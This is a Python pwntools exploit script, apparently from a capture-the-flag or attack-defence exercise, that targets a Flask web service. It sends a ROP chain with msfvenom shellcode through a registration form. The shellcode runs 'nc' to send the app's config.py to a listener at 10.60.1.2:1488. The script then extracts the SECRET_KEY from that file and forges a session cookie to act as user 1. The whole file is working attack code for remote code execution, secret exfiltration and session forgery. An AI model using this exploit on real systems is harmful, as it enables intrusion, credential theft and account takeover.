#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1
from pwn import *
from bs4 import BeautifulSoup
from flask.sessions import SecureCookieSessionInterface
import ast
import requests
import base64
import urllib.parse
import re

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './path/to/binary'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4141)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
class MockApp(object):
    def __init__(self, secret_key):
        self.secret_key = secret_key

def encode(secret_key, session_cookie_structure):
    app = MockApp(secret_key)
    session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
    si = SecureCookieSessionInterface()
    s = si.get_signing_serializer(app)
    return s.dumps(session_cookie_structure)

#msfvenom -p linux/x64/exec CMD="nc 10.60.1.2 1488 < /usr/app/config.py" -f python -b '\x00' 
buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05"
buf += b"\xef\xff\xff\xff\x48\xbb\x12\xcf\x2c\xba\x46\x96\x7b"
buf += b"\x3a\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += b"\x5a\x77\x03\xd8\x2f\xf8\x54\x49\x7a\xcf\xb5\xea\x12"
buf += b"\xc9\x29\x5c\x7a\xe2\x4f\xee\x18\xc4\x93\x1d\x12\xcf"
buf += b"\x2c\xd4\x25\xb6\x4a\x0a\x3c\xf9\x1c\x94\x77\xb8\x49"
buf += b"\x1a\x23\xfb\x14\x82\x66\xaa\x5b\x15\x67\xbc\x5e\x95"
buf += b"\x27\xe6\x0b\x15\x71\xa0\x42\xdc\x2f\xf1\x55\x4a\x6b"
buf += b"\xcf\x7a\xed\x12\xc8\x11\x01\x4a\xc0\x29\xba\x46\x96"
buf += b"\x7b\x3a"

pop_rdi = 0x000000000040140b #: pop rdi; ret; 
pop_rsi = 0x0000000000401409 #: pop rsi; pop r15; ret;
pop_rdx = 0x00000000004011c7 #: pop rdx; nop; pop rbp; ret;
mprotect = 0x401080
read = 0x401050

p = b''
p += b'A'*268
p += p64(276)
p += b'B'*4
p += p64(pop_rdi)
p += p64(0x400000)
p += p64(pop_rsi)
p += p64(0x1000)
p += b'JUNKJUNK'
p += p64(pop_rdx)
p += p64(0x7)
p += b'JUNKJUNK'
p += p64(mprotect)
p += p64(pop_rdi)
p += p64(0)
p += p64(pop_rsi)
p += p64(0x400000)
p += b'JUNKJUNK'
p += p64(pop_rdx)
p += p64(0x100)
p += b'JUNKJUNK'
p += p64(read)
p += p64(0x400000)
p = p.ljust(1024, b'\x90')
p += buf

r = requests.get(f'http://{host}:{port}/register')
csrf = BeautifulSoup(r.content, 'lxml').find('input', {'name': 'csrf_token'})['value']
log.success(f'CSRF: {csrf}')

data = b'csrf_token=' + csrf.encode() + b'&username=asd&password=' + urllib.parse.quote_plus(base64.b64encode(p)).encode() + b'&password2=' + urllib.parse.quote_plus(base64.b64encode(p)).encode() + b'&submit=Register'
headers = b'POST /register HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ' + str(len(data)).encode() + b'\r\n\r\n'

l = listen(1488)
io = start()
io.send(headers + data)
srv = l.wait_for_connection()
data = srv.recv()
secret = re.search('\'SECRET_KEY\'\) or \'.*\'', data.decode()).group(0)[18:][:-1]
log.success(f'SECRET: {secret}')

cookie = encode(secret, "{'_fresh': True, '_id': '73e4c50009b2daec50c30db3e916bbba8320c68eb83aa7da14246fcc9144078c0e749ecd2184d564f9b63696e17e1c3feafa01816ab731694ecdd9e31f513580', '_user_id': '1', 'csrf_token': '128066d33edc1ea30be929e8cea34f7309e33a70'}");
log.success(f'COOKIE for userid 1: {cookie}')

r = requests.get(f'http://{host}:{port}/settings', cookies={'session': cookie})
threads = list(map(lambda x: x['href'], BeautifulSoup(r.content, 'lxml').find_all('a', {"style":"color: #000"})))
log.success(f'threads: {threads}')

#io.interactive()

